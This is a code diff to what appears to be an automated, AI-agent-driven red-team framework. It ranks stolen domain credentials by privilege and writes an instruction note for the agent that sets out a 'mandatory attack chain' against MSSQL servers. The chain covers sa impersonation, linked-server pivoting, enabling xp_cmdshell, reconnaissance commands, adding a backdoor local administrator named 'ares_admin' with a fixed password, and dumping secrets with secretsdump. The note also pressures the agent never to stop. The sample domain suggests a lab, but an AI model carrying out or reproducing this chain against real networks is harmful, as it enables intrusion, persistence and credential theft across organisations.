@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import asyncio
 import hashlib
+import re
 import threading
 from typing import TYPE_CHECKING, Any
 
@@ -784,13 +785,22 @@ class PublishingMixin:
                 )
                 continue
 
+            # Deduplicate by username (not domain\username) — same user with
+            # different domain prefixes is still the same MSSQL login
+            uname_lower = cred.username.lower()
             key = f"{cred.domain}\\{cred.username}"
             if key in seen:
                 continue
+            # Also skip if we already have this username from another domain
+            # (e.g., samwell.tarly@north.sevenkingdoms.local and @sevenkingdoms.local)
+            if uname_lower in seen:
+                continue
             seen.add(key)
+            seen.add(uname_lower)
 
-            # Prioritize SQL service accounts
+            # Prioritize SQL service accounts and admin accounts
             is_sql_account = "sql" in cred.username.lower()
+            is_admin = cred.is_admin
 
             sql_creds.append(
                 {
@@ -798,12 +808,18 @@ class PublishingMixin:
                     "password": cred.password,
                     "domain": cred.domain,
                     "is_sql_account": str(is_sql_account),
+                    "is_admin": str(is_admin),
                 }
             )
 
-        # Sort to prioritize SQL accounts
-        sql_creds.sort(key=lambda x: x.get("is_sql_account", "False") != "True")
-        return sql_creds[:5]  # Return top 5 candidates
+        # Sort to prioritize: SQL accounts first, then admin accounts, then others
+        def _cred_sort_key(c: dict[str, str]) -> tuple[int, int]:
+            sql = 0 if c.get("is_sql_account") == "True" else 1
+            admin = 0 if c.get("is_admin") == "True" else 1
+            return (sql, admin)
+
+        sql_creds.sort(key=_cred_sort_key)
+        return sql_creds[:8]  # Return top 8 candidates
 
     async def _recheck_golden_ticket_on_dc_discovery(
         self: RedTeamDispatcher,
@@ -975,6 +991,16 @@ class PublishingMixin:
                             f"(had {old_cred_count} creds, now have {len(sql_creds)})"
                         )
 
+            # Extract actual MSSQL port from nmap services (may differ from 1433 for named instances)
+            mssql_port = 1433
+            for svc in host.services:
+                svc_lower = svc.lower()
+                if any(ind in svc_lower for ind in ("mssql", "ms-sql", "sqlserver")):
+                    port_match = re.match(r"(\d+)/", svc)
+                    if port_match:
+                        mssql_port = int(port_match.group(1))
+                        break
+
             host_domain = ""
             if host.hostname and "." in host.hostname:
                 host_domain = host.hostname.lower().split(".", 1)[-1]
@@ -1013,17 +1039,28 @@ class PublishingMixin:
                     continue
                 self.shared_state.mark_processed("processed_cross_forest_pivots", pivot_key)
 
+                port_note = f" MSSQL port: {mssql_port}." if mssql_port != 1433 else ""
                 details = {
                     "hostname": host.hostname,
                     "services": host.services,
+                    "mssql_port": mssql_port,
                     "available_credentials": sql_creds,
                     "note": (
-                        f"CRITICAL CROSS-FOREST PIVOT. This MSSQL server sits on the designed path "
-                        f"between dominated domains and undominated forests ({pivot_domains}). "
-                        f"Prioritize mssql_enum_impersonation, mssql_enum_linked_servers, "
-                        f"mssql_linked_enable_xpcmdshell, and mssql_linked_xpcmdshell. "
-                        f"Do not stop at SQL auth; use linked servers to reach the foreign host and "
-                        f"dump host-local secrets for the next pivot."
+                        f"CRITICAL CROSS-FOREST PIVOT to {pivot_domains}.{port_note} "
+                        f"MANDATORY ATTACK CHAIN (follow ALL steps in order): "
+                        f"1) mssql_enum_impersonation with EACH credential (port={mssql_port}). "
+                        f"2) MANDATORY: If impersonation found (sa or any user), you MUST call "
+                        f"mssql_impersonate BEFORE any linked server queries. Without sysadmin "
+                        f"context, linked servers connect as ANONYMOUS LOGON and FAIL. "
+                        f"3) mssql_enum_linked_servers — find cross-forest linked servers. "
+                        f"4) mssql_linked_enable_xpcmdshell on the foreign linked server. "
+                        f"5) mssql_linked_xpcmdshell — execute 'whoami /all', 'net user /domain', "
+                        f"'net group \"Domain Admins\" /domain' on foreign host. "
+                        f"6) Create a local admin: 'net user ares_admin P@ssw0rd123! /add && "
+                        f"net localgroup Administrators ares_admin /add'. "
+                        f"Then use secretsdump with ares_admin against this host. "
+                        f"DO NOT STOP after enumerating — you MUST get RCE and extract creds. "
+                        f"TRY ALL CREDENTIALS — one of them is sysadmin or can impersonate sa."
                     ),
                 }
 
@@ -1040,12 +1077,18 @@ class PublishingMixin:
                 )
                 continue
 
+            port_hint = (
+                f" MSSQL port: {mssql_port} — pass port={mssql_port} to all mssql_ tools."
+                if mssql_port != 1433
+                else ""
+            )
             vuln_details: dict[str, Any] = {
                 "hostname": host.hostname,
                 "services": host.services,
+                "mssql_port": mssql_port,
                 "available_credentials": sql_creds,
                 "note": f"Auto-detected MSSQL service with {len(sql_creds)} potential SQL credential(s). "
-                f"Check for linked servers and impersonation.{cross_forest_note}",
+                f"Check for linked servers and impersonation.{port_hint}{cross_forest_note}",
             }
 
             # Queue mssql_linked_server vulnerability
@@ -1061,9 +1104,10 @@ class PublishingMixin:
             impersonation_details: dict[str, Any] = {
                 "hostname": host.hostname,
                 "services": host.services,
+                "mssql_port": mssql_port,
                 "available_credentials": sql_creds,
                 "note": f"Auto-detected MSSQL service with {len(sql_creds)} potential SQL credential(s). "
-                f"Check for impersonation rights (EXECUTE AS) to sa, dbo, or other privileged logins.{cross_forest_note}",
+                f"Check for impersonation rights (EXECUTE AS) to sa, dbo, or other privileged logins.{port_hint}{cross_forest_note}",
             }
             await self.queue_vulnerability(
                 vuln_type="mssql_impersonation",
